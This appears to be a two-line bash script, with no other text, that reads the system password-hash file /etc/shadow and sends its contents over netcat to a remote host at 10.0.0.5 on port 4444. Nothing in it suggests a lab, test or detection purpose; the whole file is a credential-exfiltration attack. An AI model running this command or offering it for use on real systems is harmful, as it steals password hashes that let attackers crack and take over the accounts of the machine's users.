#!/bin/bash
cat /etc/shadow | nc 10.0.0.5 4444
